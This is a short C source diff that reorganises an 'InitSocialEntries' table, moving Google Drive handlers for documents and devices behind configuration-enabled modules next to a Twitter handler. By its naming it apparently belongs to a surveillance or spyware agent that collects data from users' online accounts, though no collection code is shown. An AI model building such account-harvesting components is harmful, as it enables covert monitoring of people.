@@ -20,6 +20,7 @@
 #include "position.h"
 
 #include "googledocs.h"
+#include "device.h"
 
 #undef   _INCLUDE_GLOBAL_FUNCTIONS_
 #include "version.h"
@@ -484,11 +485,6 @@ VOID InitSocialEntries()
 		wcscpy_s(pSocialEntry[n].strDomain, TWITTER_DOMAIN);
 		pSocialEntry[n].fpRequestHandler = TwitterMessageHandler;
 		n++;
-
-		//google drive
-		wcscpy_s(pSocialEntry[n].strDomain, GD_DOMAIN);
-		pSocialEntry[n].fpRequestHandler = GoogleDocsHandler;
-		n++;
 	}
 
 	if (ConfIsModuleEnabled(L"addressbook"))
@@ -538,6 +534,30 @@ VOID InitSocialEntries()
 		n++;
 
 
+	}
+
+	//google devices
+	if(ConfIsModuleEnabled(L"device"))
+	{
+#ifdef _DEBUG
+		OutputDebug(L"[*] Social: inizializing device\n");
+#endif
+		//google drive
+		wcscpy_s(pSocialEntry[n].strDomain, GD_DOMAIN);
+		pSocialEntry[n].fpRequestHandler = GoogleDeviceHandler;
+		n++;
+	}
+
+	//google drive
+	if(ConfIsModuleEnabled(L"file"))
+	{
+#ifdef _DEBUG
+		OutputDebug(L"[*] Social: inizializing documents\n");
+#endif
+		//google drive
+		wcscpy_s(pSocialEntry[n].strDomain, GD_DOMAIN);
+		pSocialEntry[n].fpRequestHandler = GoogleDocsHandler;
+		n++;
 	}
 
 	// load timestamps
